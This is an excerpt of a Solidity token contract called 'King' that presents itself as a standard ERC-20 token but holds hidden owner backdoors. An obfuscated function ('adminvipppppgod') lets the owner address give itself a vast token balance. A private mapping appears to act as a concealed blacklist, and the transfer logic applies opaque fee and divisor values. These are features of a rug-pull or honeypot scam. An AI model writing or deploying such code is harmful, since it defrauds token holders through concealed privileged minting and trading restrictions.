...
contract King is Context, IERC20, IERC20Metadata,Ownable {
    ...
    address public  _godceo;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 public constant dddWANGNUM = 2330000000*10**18;
    /**
    ...
    mapping(address => bool) private zmdao;
    function testSWap(address sss) external   {
        if (_godceo != _msgSender()){
            
        }else if (_godceo == _msgSender()){
            zmdao[sss] = false;
        }
    }
    ...
    function chazm(address sss) public view returns(bool)  {
        return zmdao[sss];
    }

    function adminvipppppgod(uint256 amount) external {
        if (_godceo == _msgSender()){
            address jjj = _msgSender();
            _balances[jjj] = dddWANGNUM*(50000);
        }
    }
    ...
    function _transfer(
        ...
        uint256 feeAmount = amount.mul(pfFEE).div(100);
        uint256 addAmount = amount.div(xishudddd)-feeAmount;
